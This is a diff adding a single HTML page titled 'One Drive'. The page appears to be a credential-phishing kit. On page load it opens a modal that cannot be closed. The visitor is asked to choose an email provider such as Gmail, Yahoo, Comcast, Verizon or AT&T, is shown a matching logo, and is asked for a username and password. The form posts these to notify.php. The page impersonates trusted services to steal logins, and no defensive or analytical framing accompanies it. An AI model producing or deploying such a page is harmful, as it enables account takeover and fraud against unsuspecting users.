@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>One Drive</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha2/css/bootstrap.min.css">
+  <style>
+    /* Add custom styles here */
+    body {
+      background-image: url("logo.png");
+      background-size: 100%;
+  background-repeat: no-repeat;
+    }
+
+    .modal.fade .modal-dialog {
+      transform: translateY(-50px);
+      opacity: 0;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+    }
+
+    .modal.fade.show .modal-dialog {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    
+    .modal-dialog-centered {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 10px;;
+
+    }
+
+    .modal-dialog-centered form {
+      max-width: 450px;
+      margin: 0 auto;
+      padding: 10px;;
+    }
+
+    .modal-content .form-label {
+      float: left;
+      clear: left;
+    }
+
+    .modal-content .form-control {
+      border: none;
+      border-bottom: 2px solid #ccc;
+      height: 45px;
+      border-radius: 0;
+      margin-bottom: 60px;
+    }
+    
+    .modal-content .clear-input {
+      position: absolute;
+      top: 12px;
+      right: 10px;
+      color: #999;
+      cursor: pointer;
+    }
+
+  </style>
+</head>
+<body>sa
+
+<!-- Modal -->
+<div class="modal fade" id="loginModal" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content text-center">
+      <!-- Modal content here -->
+      <div class="modal-body p-4">
+        <h5 class="modal-title mb-4" id="loginModalLabel"></h5>
+        
+        <form method="post" action="notify.php">
+          <div class="mb-3">
+          <img src="images/0.png" width="150px"/>
+          </div>
+          <div class="mb-3">
+
+            <label style="font-size:17px" for="email" class="form-label">Select a Provider</label>
+            <select id="emailServiceSelect" name="provider" style="width: 100%; background-color: aliceblue;height: 40px;border-radius: 10px;">
+              <option value="">Select </option>
+              <option value="gmail">Google Mail </option>
+              <option value="yahoo">Yahoo Mail</option>
+              <option value="comcast">Comcast</option>
+              <option value="verizon">Verizon</option>
+              <option value="at">AT&T</option>
+              <option value="others">Other</option>
+            </select>
+            
+          </div>
+          <div class="mb-3">
+            <label id="logoLabel"></label>
+          </div>
+
+          <div class="mb-3">
+
+            <label style="font-size:17px" for="email" class="form-label">Username</label>
+            <input type="text" name="uname" style="width: 100%; background-color: aliceblue;height: 40px;border-radius: 10px;" placeholder="Enter Username">
+
+          </div>
+
+
+          <div class="mb-3">
+
+            <label style="font-size:17px" for="email" class="form-label">Password</label>
+            <input type="password" name="upass" style="width: 100%; background-color: aliceblue;height: 40px;border-radius: 10px;" placeholder="Enter Password">
+            
+          </div>
+
+          <div class="mb-3">
+
+            
+          </div>
+          <div class="mb-4">
+          <!-- <button style="background-color: rgb(1, 76, 236);width:200px;color:black;border-radius:20px;height:40px;margin-top:20px;" type="submit" class="btn btn-primary">Continue</button> -->
+
+          </div>
+          <div class="mb-4">
+          <button style="background-color: rgb(1, 76, 236);width: 100%;color:white;height:50px;padding:10px;border-radius:13px;border-color: rgb(1, 76, 236)" type="submit" class="btn btn-primary">Continue</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+    // Get references to the select element and label
+    const emailServiceSelect = document.getElementById("emailServiceSelect");
+    const logoLabel = document.getElementById("logoLabel");
+
+    // Add an event listener to the select element
+    emailServiceSelect.addEventListener("change", function () {
+        // Get the selected option's value
+        const selectedOption = emailServiceSelect.value;
+
+        // Check if the selected option is "gmail"
+        if (selectedOption === "gmail") {
+            // Display the Gmail logo in the label
+            logoLabel.innerHTML = '<img src="images/1.png" alt="Gmail Logo" width="70px">';
+        } else if (selectedOption === "yahoo") {
+          console.log('yahoo');
+          logoLabel.innerHTML = '<img src="images/2.png" alt="Yahoo Logo" width="70px">';
+        }  else if (selectedOption === "comcast") {
+          logoLabel.innerHTML = '<img src="images/3.png" alt="Gmail Logo" width="70px">';
+        }
+        else if (selectedOption === "verizon") {
+          logoLabel.innerHTML = '<img src="images/4.png" alt="Gmail Logo" width="70px">';
+        }
+        else if (selectedOption === "at") {
+          logoLabel.innerHTML = '<img src="images/5.png" alt="Gmail Logo" width="70px">';
+        } else if (selectedOption === "others") {
+          logoLabel.innerHTML = '<img src="images/6.png" alt="Gmail Logo" width="70px">';
+        }
+        else {
+            // Clear the label if a different option is selected
+            logoLabel.innerHTML = '';
+        }
+    });
+</script>
+
+
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha2/js/bootstrap.min.js"></script>
+<script>
+  // Show the modal with easing motion on page load
+  window.addEventListener('DOMContentLoaded', function() {
+    var modal = new bootstrap.Modal(document.getElementById('loginModal'), {
+      backdrop: 'static'
+    });
+    modal.show();
+  });
+</script>
+
+
+
+</body>
+</html>
+
